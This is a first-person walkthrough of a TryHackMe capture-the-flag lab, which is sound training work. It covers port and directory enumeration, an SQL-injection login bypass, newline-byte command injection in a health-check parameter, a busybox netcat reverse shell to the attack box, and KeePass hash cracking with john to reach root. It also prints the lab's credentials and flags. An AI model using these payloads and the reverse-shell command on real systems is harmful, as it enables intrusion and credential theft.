
CTF challenge from Junior Penetration Tester path on TryHackMe.

**Description:** *CorpNet's internal network operations centre has been running quietly for years. Monitoring hosts, logging events, and keeping the infrastructure alive. Or so it seems. A tip from a disgruntled contractor suggests that someone on the NOC team has been cutting corners, leaving doors open, and hiding things in places no one thinks to look.*

*The portal is up. The services show green. The audit log looks clean.*

*But clean logs can be written by anyone.*

*Your job is to get in, move through the system, and find out what is really running behind the secret dashboard.*

There are two flags to grab - `user.txt` and `root.txt`.

First thing to do, as always when starting a CTF challenge, or real engagement is `nmap` scan.
`nmap -A -v -p- -T4 10.113.188.171`

Results:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:39:df:b1:74:50:23:80:c4:18:b0:84:7b:48:e3:b9 (ECDSA)
|_  256 d3:e7:8f:90:ba:ce:1e:99:0e:b0:a7:f3:1d:3a:4a:83 (ED25519)
5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: CorpNet \xE2\x80\x94 Network Operations Centre
|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
```

Next I started with fuzzing directories and files with `gobuster`:
`gobuster dir -u 'http://10.113.188.171:5050/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js,.py -b 403-500`

Results:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/internal             (Status: 200) [Size: 8770]
Progress: 163752 / 163760 (100.00%)
===============================================================
Finished
===============================================================
```

Further enumeration from `/internal` shows:
```
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 224] [--> http://10.113.188.171:5050/internal]
/health               (Status: 302) [Size: 224] [--> http://10.113.188.171:5050/internal]
/logout               (Status: 302) [Size: 224] [--> http://10.113.188.171:5050/internal]
Progress: 163752 / 163760 (100.00%)
===============================================================
Finished
===============================================================
```
But I need to be logged in to access them.

On `/internal` endpoint there is a login form, which requires `operator id` and `password`.
The login form is vulnerable to SQL injection, after injecting `1' OR 1=1 -- -` into `username` field and literally anything into `password`, I managed to login in as a `netops` operator.
Inside there is a whole *System Overview* panel, where service statuses, network segments, and audit logs are.
In the *Audit Logs* I noticed other users: `jmartin`, and `svc-mon` - only those were logged in at some point. There are also evidences on previous attempts on exploitation like SQLi in the login form (not performed by me), and attempt for RCE in the health check feature, which is great starting point.
After quite some time trying to achieve an RCE with this feature, I found the solution.
First I intercepted a request in Burp. Then I put a payload in the `target` parameter `127.0.0.1awhoami`, next I switched to HEX view, and I changed a byte representing letter `a` into `0a`, which in ASCII code is newline. Then I forwarded a request and in the response I saw `www-data`. RCE confirmed.

Next step is to achieve reverse shell. First I set up `nc` listener with `nc -lvnp 1337` command. Next I changed `whoami` command in Burp Repeater to `busybox nc 10.113.81.152 1337 -e bash`. And I got a hit.
Straight away upgraded shell with python: `python3 -c 'import pty:pty.spawn("/bin/bash")'`.

I landed in `/opt/netops` directory as a `www-data`. I ran `ls -lah` straight away, and I found `secret.config` file. After reading it with `cat secret.config` I found credentials for some `backup_agent`: `sysadmin:S3cur3Backup$Acc3ss!`, I checked `/etc/passwd` and there I found that `sysadmin` user is present on this machine. I tried to ssh into machine with those credentials, and it worked. I landed as `sysadmin` on the machine.
In the `/home/sysadmin` I found first flag:
**THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}**

Now, it's for privilege escalation and gaining root.
In the `/home/sysadmin/backups` I found `infrastructure.kdbx`, which I downloaded into attack box.
The keepass file needs to be cracked, so first I generated a hash using `keepass2john`: `keepass2john infrastructure.kdbx > kdbx.hash`
And I proceed to crack it with `rockyou.txt`:
`john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash`

Turns out the password was pretty weak - `spring`.
I opened `infrastructure.kdbx` with KeePassXC with freshly cracked password, and in there, I found `root` credentials - `root:S3cur3P4ss0nK33p4ss`

To gain `root` I simply used `su root` to switch users, and I went straight into `/root` directory where I found the last flag.
**THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}**
